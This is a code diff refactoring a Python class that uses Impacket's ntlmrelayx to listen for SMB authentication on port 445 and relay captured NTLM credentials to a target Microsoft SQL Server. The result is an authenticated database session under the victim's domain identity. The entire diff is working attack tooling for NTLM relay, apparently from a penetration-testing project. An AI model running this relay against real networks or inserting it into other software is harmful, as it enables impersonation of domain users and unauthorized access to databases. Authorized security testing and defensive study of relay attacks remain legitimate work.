@@ -2,21 +2,22 @@
 
 # Built-in imports
 import sys
-import time
+import threading
 
 # Third party imports
 from loguru import logger
 
 from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS, ProtocolAttack
 from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
-
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 
-# Local library imports
+# Local imports
 from ..models.server import Server
+from ..utils.storage import get_data_dir
 from .database import DatabaseContext
+
 
 class RelayMSSQL:
     """
@@ -25,19 +26,17 @@ class RelayMSSQL:
     """
 
     def __init__(self, hostname: str, port: int = 1433):
-        self.threads = set()
-        self.captured_client = None  # Store single captured client
-        self.server_instance = None  # Will be set when waiting for connection
+        self._threads: set = set()
+        self._captured_client: dict | None = None
+        self._capture_event = threading.Event()
 
-        # Only register MSSQL protocol client (avoid loading all protocols)
         minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}
 
-        self.targets_processor = TargetsProcessor(
+        self._targets_processor = TargetsProcessor(
             singleTarget=f"mssql://{hostname}:{port}",
             protocolClients=minimal_protocol_clients,
         )
 
-        # Create custom attack class that references this instance
         self._register_attack()
 
     def _register_attack(self):
@@ -45,52 +44,40 @@ class RelayMSSQL:
         relay_instance = self
 
         class CustomMSSQLAttack(ProtocolAttack):
-            """Custom MSSQL attack bound to RelayMSSQL instance."""
-
             PLUGIN_NAMES = ["MSSQL"]
 
             def run(self):
-                """Capture authenticated client after successful relay."""
                 logger.success(
                     f"Successfully relayed authentication for {self.domain}\\{self.username}"
                 )
-                logger.info(
-                    f"Target: {self.target.hostname if self.target else 'Unknown'}"
-                )
-
-                # Store in parent RelayMSSQL instance
-                relay_instance.captured_client = {
+                relay_instance._captured_client = {
                     "client": self.client,
                     "username": self.username,
                     "domain": self.domain,
                 }
+                relay_instance._capture_event.set()
                 return True
 
-        # Register in the GLOBAL Impacket attacks dictionary
         PROTOCOL_ATTACKS["MSSQL"] = CustomMSSQLAttack
-        logger.debug("Registered CustomMSSQLAttack in global PROTOCOL_ATTACKS")
 
-    def start(self, smb2support: bool = False, ntlmchallenge: str = None):
-        # Only use MSSQL protocol client
+    def start(self, smb2support: bool = False, ntlmchallenge: str | None = None):
         minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}
 
-        # set up config
-        c = NTLMRelayxConfig()
+        loot_dir = str(get_data_dir() / "relay-loot")
 
+        c = NTLMRelayxConfig()
         c.setProtocolClients(minimal_protocol_clients)
-        c.setTargets(self.targets_processor)
+        c.setTargets(self._targets_processor)
         c.setExeFile(None)
         c.setCommand(None)
         c.setEnumLocalAdmins(None)
         c.setAddComputerSMB(None)
-        c.setDisableMulti(
-            True
-        )  # Single target mode - relay immediately during SessionSetup
+        c.setDisableMulti(True)
         c.setKeepRelaying(False)
         c.setEncoding(sys.getdefaultencoding())
         c.setMode("RELAY")
-        c.setAttacks(PROTOCOL_ATTACKS)  # Use global PROTOCOL_ATTACKS
-        c.setLootdir(".")
+        c.setAttacks(PROTOCOL_ATTACKS)
+        c.setLootdir(loot_dir)
         c.setOutputFile(None)
         c.setdumpHashes(False)
         c.setSMB2Support(smb2support)
@@ -100,8 +87,9 @@ class RelayMSSQL:
 
         s = SMBRelayServer(c)
         s.start()
-        self.threads.add(s)
-        return c
+        self._threads.add(s)
+
+        logger.info("SMB relay server listening on 0.0.0.0:445")
 
     def wait_for_connection(
         self, server_instance: Server, timeout: int = 60
@@ -109,65 +97,41 @@ class RelayMSSQL:
         """
         Wait for a relayed connection and create a DatabaseContext from it.
 
-        Args:
-            server_instance: Server model with hostname, port, database already configured
-            timeout: Maximum seconds to wait for a connection
-
         Returns:
-            DatabaseContext instance or None if no connection captured
+            DatabaseContext instance, or None if timeout or auth failure.
         """
-        self.server_instance = server_instance
-        logger.info(f"Waiting up to {timeout} seconds for relayed connection")
+        logger.info(f"Waiting up to {timeout}s for a relayed connection")
 
-        start_time = time.time()
-        while time.time() - start_time < timeout:
-            # Check if all targets have been processed (authentication failed)
-            # When keepRelaying=False and auth fails, TargetsProcessor has no more targets
-            if (
-                len(self.targets_processor.generalCandidates) == 0
-                and len(self.targets_processor.namedCandidates) == 0
-            ):
-                if len(self.targets_processor.failedAttacks) > 0:
-                    return None
+        captured = self._capture_event.wait(timeout=timeout)
 
-            # Check if we captured a successful client
-            if self.captured_client:
-                logger.success("Relayed connection captured!")
+        if not captured or self._captured_client is None:
+            logger.warning(f"No relayed connection received within {timeout}s")
+            return None
 
-                # Extract authenticated client and user info
-                mssql_client = self.captured_client["client"]
-                username = self.captured_client["username"]
-                domain = self.captured_client["domain"]
+        mssql_client = self._captured_client["client"]
+        username = self._captured_client["username"]
+        domain = self._captured_client["domain"]
 
-                # Create DatabaseContext using the authenticated client
-                logger.trace(
-                    f"Creating DatabaseContext for {domain}\\{username}@{server_instance.hostname}"
-                )
-                database_context = DatabaseContext(
-                    server=server_instance, mssql_instance=mssql_client
-                )
+        logger.success("Relayed connection captured")
+        logger.trace(
+            f"Creating DatabaseContext for {domain}\\{username}@{server_instance.hostname}"
+        )
 
-                # Update server with relayed user info
-                database_context.server.mapped_user = (
-                    f"{domain}\\{username}" if domain else username
-                )
-                logger.trace("DatabaseContext created successfully")
+        database_context = DatabaseContext(
+            server=server_instance, mssql_instance=mssql_client
+        )
+        database_context.server.mapped_user = (
+            f"{domain}\\{username}" if domain else username
+        )
 
-                return database_context
-
-            time.sleep(0.1)
-
-        logger.warning(f"No relayed connection received within {timeout} seconds")
-        return None
+        return database_context
 
     def stop_servers(self):
         """Stop all relay servers."""
-        for thread in list(self.threads):
+        for thread in list(self._threads):
             if isinstance(thread, SMBRelayServer):
-                thread.server.shutdown()
-            self.threads.discard(thread)
-
-    def __del__(self) -> None:
-        """Destructor - ensure relay servers are stopped."""
-        if self.threads:
-            self.stop_servers()
+                try:
+                    thread.server.shutdown()
+                except Exception as exc:
+                    logger.debug(f"Error shutting down relay server: {exc}")
+            self._threads.discard(thread)
